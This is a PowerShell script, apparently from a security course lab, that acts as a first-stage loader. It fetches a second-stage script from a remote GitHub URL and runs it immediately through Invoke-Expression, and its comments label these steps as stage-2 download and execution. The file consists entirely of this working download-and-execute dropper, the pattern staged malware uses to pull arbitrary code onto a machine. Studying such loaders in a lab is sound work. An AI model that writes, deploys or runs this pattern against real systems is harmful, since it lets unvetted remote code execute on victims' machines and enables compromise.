# write_debug: Used to show debugging output.
function Write-DebugOutput($str_to_write) {
    if ($debug) {
        try {
            Write-Output $str_to_write
        } catch {
            Write-Output ("Error :" + $str_to_write)
        }
    }
}
# Whether Write-DebugOutput will do anything.
$debug = $true
$remoteUrl = "https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/remote_stage2.ps1" # Replace with your actual URL
try {
    # Stage 2 Step 1: Download the script content using Invoke-WebRequest
    # UseBasicParsing is recommended for scripts without a DOM requirement.
    $response = Invoke-WebRequest -Uri $remoteUrl -Method GET
    if ($response.StatusCode -eq 200) {
        $stage2Content = $response.Content
        #Write-DebugOutput ("stage2Content: " + $stage2Content)
        # Stage 2 Step 2: execute remote content
        try {
            # Use Invoke-Expression to execute the string content as PowerShell code.
            Invoke-Expression $stage2Content
        } catch {
            Write-DebugOutput "REMOTE CONTENT EVAL ERROR DETAILS:"
            # PowerShell error handling uses $_ to access the current error object
            Write-DebugOutput ("An error message: " + $_.Exception.Message)
        }
        Write-DebugOutput "Script executed stage 2 successfully."
    } else {
        Write-DebugOutput ("Failed to download script. Status: " + $response.StatusCode)
    }
} catch {
    Write-DebugOutput "HTTP GET ERROR DETAILS:"
    Write-DebugOutput ("An error message: " + $_.Exception.Message)
}
